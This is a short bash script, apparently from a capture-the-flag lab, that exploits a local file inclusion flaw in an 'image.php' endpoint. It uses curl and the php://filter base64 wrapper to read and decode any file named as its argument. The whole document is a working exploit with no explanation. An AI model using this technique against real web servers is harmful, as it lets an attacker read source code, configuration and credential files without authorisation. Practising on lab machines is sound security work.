#!/bin/bash
curl -s "http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=$1" | base64 -d
